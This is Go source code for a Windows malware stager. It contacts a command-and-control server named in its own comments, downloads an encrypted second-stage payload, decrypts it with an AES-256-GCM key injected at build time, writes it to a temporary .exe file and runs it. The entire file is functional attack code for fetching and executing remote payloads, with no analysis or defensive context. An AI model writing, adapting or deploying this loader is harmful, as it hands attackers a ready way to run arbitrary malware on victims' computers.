//go:build windows
// +build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"io"
	"net/http"
	"os"
	"os/exec"
)

var (
	BaseURL string // origin of the C2, injected via ldflags
	Token   string // hex-encoded stage token, injected via ldflags
	Sig     string // url-safe base64 HMAC signature, injected via ldflags
	KeyHex  string // hex-encoded AES-256-GCM stage key, injected via ldflags
)

func main() {
	resp, err := http.Get(BaseURL + "/stage/" + Token + "?s=" + Sig)
	if err != nil {
		os.Stderr.WriteString("error fetching stage: " + err.Error() + "\n")
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		os.Stderr.WriteString("stage fetch failed: " + resp.Status + "\n")
		return
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		os.Stderr.WriteString("error reading response body: " + err.Error() + "\n")
		return
	}

	key, err := hex.DecodeString(KeyHex)
	if err != nil {
		os.Stderr.WriteString("error decoding stage key: " + err.Error() + "\n")
		return
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		os.Stderr.WriteString("error initializing cipher: " + err.Error() + "\n")
		return
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		os.Stderr.WriteString("error initializing AEAD: " + err.Error() + "\n")
		return
	}
	ns := aead.NonceSize()
	if len(body) < ns {
		os.Stderr.WriteString("stage payload too short\n")
		return
	}

	data, err := aead.Open(nil, body[:ns], body[ns:], nil)
	if err != nil {
		os.Stderr.WriteString("error decrypting stage: " + err.Error() + "\n")
		return
	}

	tmpFile, err := os.CreateTemp("", "*.exe")
	if err != nil {
		os.Stderr.WriteString("error creating temp file: " + err.Error() + "\n")
		return
	}
	defer tmpFile.Close()

	if _, err := tmpFile.Write(data); err != nil {
		os.Stderr.WriteString("error writing payload to temp file: " + err.Error() + "\n")
		return
	}
	tmpPath := tmpFile.Name()
	tmpFile.Close()

	exec.Command(tmpPath).Start()
}